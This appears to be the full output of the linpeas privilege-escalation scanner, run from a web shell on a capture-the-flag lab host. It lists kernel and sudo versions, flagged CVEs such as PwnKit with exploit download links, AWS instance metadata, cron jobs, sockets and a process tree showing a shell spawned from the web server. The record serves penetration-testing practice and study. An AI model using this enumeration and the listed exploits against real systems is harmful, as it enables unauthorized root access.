         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |
    |---------------------------------------------------------------------------------| 
    |         Get the latest version    :     https://github.com/sponsors/carlospolop |
    |         Follow on Twitter         :     @carlospolopm                           |
    |         Respect on HTB            :     SirBroccoli                             |
    |---------------------------------------------------------------------------------|
    |                                 Thank you!                                      |
    \---------------------------------------------------------------------------------/
          linpeas-ng by carlospolop

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════
                               ╚═══════════════════╝
OS: Linux version 4.15.0-132-generic (buildd@lgw01-amd64-030) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.12)) #136~16.04.1-Ubuntu SMP Tue Jan 12 18:18:45 UTC 2021
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
Hostname: osboxes
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)
[+] /bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)

Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE

                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════
                              ╚════════════════════╝
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits
Linux version 4.15.0-132-generic (buildd@lgw01-amd64-030) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.12)) #136~16.04.1-Ubuntu SMP Tue Jan 12 18:18:45 UTC 2021
Distributor ID:	Ubuntu
Description:	Ubuntu 16.04.6 LTS
Release:	16.04
Codename:	xenial

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
Sudo version 1.8.16

╔══════════╣ CVEs Check
Vulnerable to CVE-2021-4034

Potentially Vulnerable to CVE-2022-2588

╔══════════╣ USBCreator
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation

╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

╔══════════╣ Date & uptime
Mon Mar 13 13:41:47 EDT 2023
 13:41:47 up  1:32,  0 users,  load average: 2.93, 2.31, 1.57

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices
UUID=75f494bc-4425-4695-9902-df5e65c8353d	/	ext4	errors=remount-ro	0 1
UUID=167f8b73-6bf4-4874-a479-5c2c706389ea	/boot	ext4	defaults	0 2
UUID=26325eaa-7c61-42ff-a438-ef509001045e	/home	ext4	defaults	0 0
UUID=7018327d-6764-4664-9598-9de389c1d449	none	swap	sw	0 0

╔══════════╣ Environment
╚ Any private information inside environment variables?
HISTFILESIZE=0
SHLVL=1
OLDPWD=/var/www/html/site.wekor.thm/wordpress/wp-content/themes/twentytwentyone
APACHE_RUN_DIR=/var/run/apache2
APACHE_PID_FILE=/var/run/apache2/apache2.pid
_=./linpeas.sh
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
HISTSIZE=0
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data
APACHE_LOG_DIR=/var/log/apache2
PWD=/tmp
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed
dmesg Not Found

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security//5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security//5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2

╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.
apparmor module is loaded.
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found
═╣ Execshield enabled? ............ Execshield Not Found
═╣ SELinux enabled? ............... sestatus Not Found
═╣ Seccomp enabled? ............... disabled
═╣ AppArmor profile? .............. unconfined
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... enabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (xen)

                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════
                                   ╚═══════════╝
╔══════════╣ Container related tools present
╔══════════╣ Am I Containered?
╔══════════╣ Container details
═╣ Is this a container? ........... No
═╣ Any running containers? ........ No

                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════
                                     ╚═══════╝
═╣ Google Cloud Platform? ............... No
═╣ AWS ECS? ............................. No
═╣ AWS EC2? ............................. Yes
═╣ AWS Lambda? .......................... No

╔══════════╣ AWS EC2 Enumeration
ami-id: ami-043c7043132ed4218
instance-action: none
instance-id: i-02b0049f80d4ba6a4
instance-life-cycle: on-demand
instance-type: t2.nano
region: eu-west-1

══╣ Account Info
{
  "Code" : "Success",
  "LastUpdated" : "2023-03-13T16:50:49Z",
  "AccountId" : "739930428441"
}

══╣ Network Info
Mac: 02:fd:39:13:41:2d/
Owner ID: 739930428441
Public Hostname: 
Security Groups: AllowEverything
Private IPv4s:

Subnet IPv4: 10.10.0.0/16
PrivateIPv6s:

Subnet IPv6: 
Public IPv4s:

══╣ IAM Role

══╣ User Data

                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════
                ╚════════════════════════════════════════════════╝
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes
root         1  0.4  0.6  23996  3116 ?        Ss   12:09   0:23 /sbin/init splash
root       219  0.0  0.4   5200  2344 ?        Ss   12:09   0:02 /lib/systemd/systemd-journald
root       253  0.0  0.3  14616  1960 ?        Ss   12:10   0:02 /lib/systemd/systemd-udevd
systemd+   446  0.0  0.3  12620  1832 ?        Ssl  12:10   0:00 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
root       634  0.0  0.2   2252  1032 ?        Ss   12:10   0:00 /usr/sbin/acpid
syslog     656  0.0  0.3  30736  1856 ?        Ssl  12:10   0:00 /usr/sbin/rsyslogd -n
root       657  0.0  0.6  37684  3260 ?        Ssl  12:10   0:00 /usr/lib/accountsservice/accounts-daemon[0m
root       664  0.0  0.4   5588  2128 ?        Ss   12:10   0:00 /usr/sbin/cron -f
avahi      676  0.0  0.0   5928    56 ?        S    12:10   0:00  _ avahi-daemon: chroot helper
message+   668  0.0  0.6   6516  3344 ?        Ss   12:10   0:04 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
  └─(Caps) 0x0000000020000000=cap_audit_write
root       708  0.0  0.4   4144  2016 ?        Ss   12:10   0:00 /lib/systemd/systemd-logind
root       709  0.0  0.7  82064  3840 ?        Ssl  12:10   0:01 /usr/sbin/NetworkManager --no-daemon[0m
root       758  0.0  0.8  37184  4444 ?        Ssl  12:10   0:01 /usr/lib/policykit-1/polkitd --no-debug
root       768  0.0  0.5  43408  2980 ?        Ssl  12:10   0:00 /usr/sbin/lightdm
root       798  0.0  2.7 153216 14024 tty7     Ssl+ 12:10   0:04  _ /usr/lib/xorg/Xorg -core :0 -seat seat0 -auth /var/run/lightdm/root/:0 -nolisten tcp vt7 -novtswitch
root      1106  0.0  0.6  27912  3184 ?        Sl   12:11   0:00  _ lightdm --session-child 16 19
lightdm   1175  0.0  0.0   2376   476 ?        Ss   12:11   0:00  |   _ /bin/sh /usr/lib/lightdm/lightdm-greeter-session /usr/sbin/unity-greeter
lightdm   1185  0.2  3.3 368936 16704 ?        Sl   12:11   0:12  |       _ /usr/sbin/unity-greeter
root      1261  0.0  0.5   9376  2740 ?        S    12:11   0:00  _ lightdm --session-child 12 19
root       872  0.0  0.3   6020  1988 ?        Ss   12:10   0:00 /sbin/dhclient -1 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
root       963  0.0  0.6 805752  3064 ?        Ssl  12:10   0:00 /usr/bin/amazon-ssm-agent
root      1074  0.0  0.4 814392  2284 ?        Sl   12:11   0:00  _ /usr/bin/ssm-agent-worker
whoopsie   964  0.0  0.5  38188  2536 ?        Ssl  12:10   0:00 /usr/bin/whoopsie -f
memcache   974  0.0  0.2  47724  1380 ?        Ssl  12:10   0:00 /usr/bin/memcached -m 64 -p 11211 -u memcache -l 127.0.0.1
root       978  0.0  0.3  12588  1564 ?        Ss   12:10   0:00 /usr/bin/python /root/server.py
mysql      989  0.1 15.6 558212 78576 ?        Ssl  12:10   0:08 /usr/sbin/mysqld
root      1006  0.0  0.4  10012  2164 ?        Ss   12:10   0:00 /usr/sbin/sshd -D
root      1023  0.0  0.2   4756  1396 tty1     Ss+  12:10   0:00 /sbin/agetty --noclear tty1 linux
root      1024  0.0  0.3   4576  1704 ttyS0    Ss+  12:10   0:00 /sbin/agetty --keep-baud 115200 38400 9600 ttyS0 vt220
root      1094  0.0  2.8 117524 14260 ?        Ss   12:11   0:01 /usr/sbin/apache2 -k start
www-data  1626  0.0  6.2 122844 31536 ?        S    12:15   0:00  _ /usr/sbin/apache2 -k start
www-data  1754  0.0  5.5 122828 27756 ?        S    12:17   0:01  _ /usr/sbin/apache2 -k start
www-data  1972  0.0  5.8 122788 29604 ?        S    13:05   0:00  _ /usr/sbin/apache2 -k start
www-data  1987  0.0  6.8 125132 34340 ?        S    13:05   0:01  _ /usr/sbin/apache2 -k start
www-data  1995  0.0  6.2 123224 31636 ?        S    13:06   0:01  _ /usr/sbin/apache2 -k start
www-data  2004 40.4  5.8 120948 29152 ?        R    13:06  15:01  _ /usr/sbin/apache2 -k start
www-data  2087  0.0  0.1   2376   648 ?        S    13:21   0:00  |   _ sh -c sh
www-data  2088  0.0  0.1   2376   568 ?        S    13:21   0:00  |       _ sh
www-data  2090  0.0  0.8   9648  4052 ?        S    13:22   0:00  |           _ python3 -c import pty;pty.spawn("/bin/bash")
www-data  2091  0.0  0.3   3760  1804 pts/8    Ss   13:22   0:00  |               _ /bin/bash
www-data  2099  0.0  0.4   2912  2140 pts/8    S+   13:25   0:00  |                   _ /bin/sh ./linpeas.sh
www-data  5278  0.0  0.1   2912   724 pts/8    S+   13:43   0:00  |                       _ /bin/sh ./linpeas.sh
www-data  5282  0.0  0.5   5828  2732 pts/8    R+   13:43   0:00  |                       |   _ ps fauxwww
www-data  5281  0.0  0.1   2912   724 pts/8    S+   13:43   0:00  |                       _ /bin/sh ./linpeas.sh
www-data  2009  0.0  7.0 125236 35460 ?        S    13:06   0:01  _ /usr/sbin/apache2 -k start
www-data  2010  0.0  6.2 125192 31164 ?        S    13:06   0:00  _ /usr/sbin/apache2 -k start
www-data  2020  0.0  5.8 122676 29400 ?        S    13:06   0:00  _ /usr/sbin/apache2 -k start
www-data  2077  0.0  6.0 122788 30300 ?        S    13:16   0:00  _ /usr/sbin/apache2 -k start
lightdm   1138  0.0  0.3   6420  1604 ?        Ss   12:11   0:00 /lib/systemd/systemd --user
lightdm   1141  0.0  0.1  25012   692 ?        S    12:11   0:00  _ (sd-pam)
lightdm   1184  0.0  0.4   6164  2196 ?        Ss   12:11   0:01 /usr/bin/dbus-daemon --fork --print-pid 5 --print-address 7 --session
lightdm   1200  0.0  0.5  43480  2812 ?        Sl   12:11   0:00 /usr/lib/at-spi2-core/at-spi-bus-launcher --launch-immediately
lightdm   1206  0.0  0.4   5944  2200 ?        S    12:11   0:00  _ /usr/bin/dbus-daemon --config-file=/etc/at-spi2/accessibility.conf --nofork --print-address 3
lightdm   1210  0.0  0.3  29180  1880 ?        Sl   12:11   0:00 /usr/lib/at-spi2-core/at-spi2-registryd --use-gnome-session
lightdm   1216  0.0  0.4  38268  2344 ?        Sl   12:11   0:00 /usr/lib/gvfs/gvfsd
lightdm   1221  0.0  0.5  50692  2520 ?        Sl   12:11   0:00 /usr/lib/gvfs/gvfsd-fuse /run/user/108/gvfs -f -o big_writes
lightdm   1238  0.0  0.4  25272  2476 ?        Sl   12:11   0:00 /usr/lib/dconf/dconf-service
lightdm   1264  0.0  0.5   8156  2832 ?        S    12:11   0:00 upstart --user --startup-event indicator-services-start
lightdm   1268  0.0  0.6  46544  3480 ?        Ssl  12:11   0:00  _ /usr/lib/i386-linux-gnu/indicator-messages/indicator-messages-service
lightdm   1271  0.0  0.5  52296  2668 ?        Ssl  12:11   0:00  _ /usr/lib/i386-linux-gnu/indicator-bluetooth/indicator-bluetooth-service
lightdm   1272  0.0  0.6  71188  3256 ?        Ssl  12:11   0:00  _ /usr/lib/i386-linux-gnu/indicator-power/indicator-power-service
lightdm   1273  0.0  0.9 106952  4704 ?        Ssl  12:11   0:00  _ /usr/lib/i386-linux-gnu/indicator-datetime/indicator-datetime-service
lightdm   1274  0.1  1.5 103768  7992 ?        Ssl  12:11   0:06  _ /usr/lib/i386-linux-gnu/indicator-keyboard/indicator-keyboard-service --use-gtk
lightdm   1275  0.0  0.7 330252  3796 ?        Ssl  12:11   0:00  _ /usr/lib/i386-linux-gnu/indicator-sound/indicator-sound-service
lightdm   1276  0.0  0.5  69556  2648 ?        Ssl  12:11   0:00  _ /usr/lib/i386-linux-gnu/indicator-session/indicator-session-service
lightdm   1291  0.0  0.6  58004  3144 ?        Ssl  12:11   0:00  _ /usr/lib/i386-linux-gnu/indicator-application/indicator-application-service
lightdm   1315  0.0  0.7 200452  3784 ?        S<l  12:11   0:00  _ /usr/bin/pulseaudio --start --log-target=syslog
lightdm   1266  0.0  1.6 118376  8364 ?        Sl   12:11   0:04 nm-applet
lightdm   1312  0.0  1.5  81296  7740 ?        Sl   12:11   0:03 /usr/lib/unity-settings-daemon/unity-settings-daemon
rtkit     1319  0.0  0.4  23796  2416 ?        SNsl 12:11   0:00 /usr/lib/rtkit/rtkit-daemon
  └─(Caps) 0x0000000000800004=cap_dac_read_search,cap_sys_nice
root      1348  0.0  0.7  71464  3612 ?        Ssl  12:12   0:00 /usr/lib/upower/upowerd
colord    1360  0.0  1.0  41724  5224 ?        Ssl  12:12   0:01 /usr/lib/colord/colord
root      1631  0.0  0.6  14204  3296 ?        Ss   12:15   0:00 /usr/sbin/cupsd -l
root      1632  0.0  0.7  37576  3800 ?        Ssl  12:15   0:00 /usr/sbin/cups-browsed

╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes

╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information
COMMAND    PID  TID             USER   FD      TYPE DEVICE SIZE/OFF    NODE NAME

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory
gdm-password Not Found
gnome-keyring-daemon Not Found
lightdm process found (dump creds from memory as root)
vsftpd Not Found
apache2 process found (dump creds from memory as root)
sshd Not Found

╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs
/usr/bin/crontab
incrontab Not Found
-rw-r--r-- 1 root root     722 Apr  5  2016 /etc/crontab

/etc/cron.d:
total 32
drwxr-xr-x   2 root root  4096 Jul 12  2020 .
drwxr-xr-x 135 root root 12288 Jan 26  2021 ..
-rw-r--r--   1 root root   102 Apr  5  2016 .placeholder
-rw-r--r--   1 root root   244 Dec 28  2014 anacron
-rw-r--r--   1 root root   670 Jun 22  2017 php
-rw-r--r--   1 root root   191 Feb 28  2019 popularity-contest

/etc/cron.daily:
total 76
drwxr-xr-x   2 root root  4096 Jan 23  2021 .
drwxr-xr-x 135 root root 12288 Jan 26  2021 ..
-rw-r--r--   1 root root   102 Apr  5  2016 .placeholder
-rwxr-xr-x   1 root root   311 Dec 28  2014 0anacron
-rwxr-xr-x   1 root root   539 Jun 15  2020 apache2
-rwxr-xr-x   1 root root   376 Mar 31  2016 apport
-rwxr-xr-x   1 root root  1474 Oct  9  2018 apt-compat
-rwxr-xr-x   1 root root   355 May 22  2012 bsdmainutils
-rwxr-xr-x   1 root root   384 Oct  5  2014 cracklib-runtime
-rwxr-xr-x   1 root root  1597 Nov 26  2015 dpkg
-rwxr-xr-x   1 root root   372 May  6  2015 logrotate
-rwxr-xr-x   1 root root  1293 Nov  6  2015 man-db
-rwxr-xr-x   1 root root   435 Nov 18  2014 mlocate
-rwxr-xr-x   1 root root   249 Nov 12  2015 passwd
-rwxr-xr-x   1 root root  3449 Feb 26  2016 popularity-contest
-rwxr-xr-x   1 root root   214 Dec  7  2018 update-notifier-common
-rwxr-xr-x   1 root root  1046 May 19  2016 upstart

/etc/cron.hourly:
total 20
drwxr-xr-x   2 root root  4096 Feb 26  2019 .
drwxr-xr-x 135 root root 12288 Jan 26  2021 ..
-rw-r--r--   1 root root   102 Apr  5  2016 .placeholder

/etc/cron.monthly:
total 24
drwxr-xr-x   2 root root  4096 Feb 26  2019 .
drwxr-xr-x 135 root root 12288 Jan 26  2021 ..
-rw-r--r--   1 root root   102 Apr  5  2016 .placeholder
-rwxr-xr-x   1 root root   313 Dec 28  2014 0anacron

/etc/cron.weekly:
total 36
drwxr-xr-x   2 root root  4096 Feb 26  2019 .
drwxr-xr-x 135 root root 12288 Jan 26  2021 ..
-rw-r--r--   1 root root   102 Apr  5  2016 .placeholder
-rwxr-xr-x   1 root root   312 Dec 28  2014 0anacron
-rwxr-xr-x   1 root root    86 Apr 13  2016 fstrim
-rwxr-xr-x   1 root root   771 Nov  6  2015 man-db
-rwxr-xr-x   1 root root   211 Dec  7  2018 update-notifier-common

/var/spool/anacron:
total 20
drwxr-xr-x 2 root root 4096 Feb 28  2019 .
drwxr-xr-x 7 root root 4096 Feb 26  2019 ..
-rw------- 1 root root    9 Mar 13 12:16 cron.daily
-rw------- 1 root root    9 Mar 13 12:25 cron.monthly
-rw------- 1 root root    9 Mar 13 12:20 cron.weekly

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
HOME=/root
LOGNAME=root

1	5	cron.daily	run-parts --report /etc/cron.daily
7	10	cron.weekly	run-parts --report /etc/cron.weekly
@monthly	15	cron.monthly	run-parts --report /etc/cron.monthly

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services
/etc/systemd/system/multi-user.target.wants/networking.service is executing some relative path
/etc/systemd/system/network-online.target.wants/networking.service is executing some relative path
You can't write on systemd PATH

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers
NEXT                         LEFT          LAST                         PASSED       UNIT                         ACTIVATES
Mon  EDT  4h 54min left Mon  EDT  1h 34min ago apt-daily.timer              apt-daily.service
Tue  EDT  16h left      Mon  EDT  1h 34min ago apt-daily-upgrade.timer      apt-daily-upgrade.service
Tue  EDT  22h left      Mon  EDT  1h 19min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
n/a                          n/a           n/a                          n/a          snapd.snap-repair.timer      snapd.snap-repair.service
n/a                          n/a           n/a                          n/a          ureadahead-stop.timer        ureadahead-stop.service

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers

╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets
/etc/systemd/system/sockets.target.wants/avahi-daemon.socket is calling this writable listener: /var/run/avahi-daemon/socket
/etc/systemd/system/sockets.target.wants/uuidd.socket is calling this writable listener: /run/uuidd/request
/lib/systemd/system/avahi-daemon.socket is calling this writable listener: /var/run/avahi-daemon/socket
/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/lib/systemd/system/systemd-bus-proxyd.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/uuidd.socket is calling this writable listener: /run/uuidd/request

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets
/com/ubuntu/upstart-session/108/1264
/run/acpid.socket
  └─(Read Write)
/run/avahi-daemon/socket
  └─(Read Write)
/run/cups/cups.sock
  └─(Read Write)
/run/dbus/system_bus_socket
  └─(Read Write)
/run/mysqld/mysqld.sock
  └─(Read Write)
/run/snapd-snap.socket
  └─(Read Write)
/run/snapd.socket
  └─(Read Write)
/run/systemd/cgroups-agent
/run/systemd/fsck.progress
/run/systemd/journal/dev-log
  └─(Read Write)
/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/journal/syslog
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/udev/control
/run/user/108/pulse/native
/run/user/108/snapd-session-agent.socket
/run/user/108/systemd/private
/run/uuidd/request
  └─(Read Write)
/tmp/.X11-unix/X0
  └─(Read Write)
/tmp/dbus-GSZ96vXamH
/tmp/dbus-b0S58ExAjE
/var/lib/amazon/ssm/ipc/health
/var/lib/amazon/ssm/ipc/termination
/var/run/avahi-daemon/socket
  └─(Read Write)
/var/run/cups/cups.sock
  └─(Read Write)
/var/run/dbus/system_bus_socket
  └─(Read Write)
/var/run/mysqld/mysqld.sock
  └─(Read Write)

╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus
Possible weak user policy found on /etc/dbus-1/system.d/avahi-dbus.conf (  <policy user="avahi">)
Possible weak user policy found on /etc/dbus-1/system.d/avahi-dbus.conf (  <policy group="netdev">)
Possible weak user policy found on /etc/dbus-1/system.d/bluetooth.conf (  <policy group="bluetooth">
  <policy group="lp">)
Possible weak user policy found on /etc/dbus-1/system.d/dnsmasq.conf (        <policy user="dnsmasq">)
Possible weak user policy found on /etc/dbus-1/system.d/kerneloops.dbus (  <policy user="kernoops">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.ColorManager.conf (  <policy user="colord">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.NetworkManager.conf (        <policy user="whoopsie">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.RealtimeKit1.conf (  <policy user="rtkit">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.network1.conf (        <policy user="systemd-network">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.resolve1.conf (        <policy user="systemd-resolve">)
Possible weak user policy found on /etc/dbus-1/system.d/pulseaudio-system.conf (  <policy user="pulse">)
Possible weak user policy found on /etc/dbus-1/system.d/wpa_supplicant.conf (        <policy group="netdev">)

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus
NAME                                       PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION        
:1.0                                         1 systemd         root             :1.0          init.scope                -          -                  
:1.1                                       665 avahi-daemon    avahi            :1.1          avahi-daemon.service      -          -                  
:1.11                                      758 polkitd         root             :1.11         polkitd.service           -          -                  
:1.14                                      768 lightdm         root             :1.14         lightdm.service           -          -                  
:1.16                                      798 Xorg            root             :1.16         lightdm.service           -          -                  
:1.17                                      964 whoopsie        whoopsie         :1.17         whoopsie.service          -          -                  
:1.18                                     1106 lightdm         root             :1.18         session-c1.scope          c1         -                  
:1.21                                     1185 unity-greeter   lightdm          :1.21         session-c1.scope          c1         -                  
:1.22                                     1264 upstart         lightdm          :1.22         session-c1.scope          c1         -                  
:1.23                                     1268 indicator-messa lightdm          :1.23         session-c1.scope          c1         -                  
:1.24                                     1271 indicator-bluet lightdm          :1.24         session-c1.scope          c1         -                  
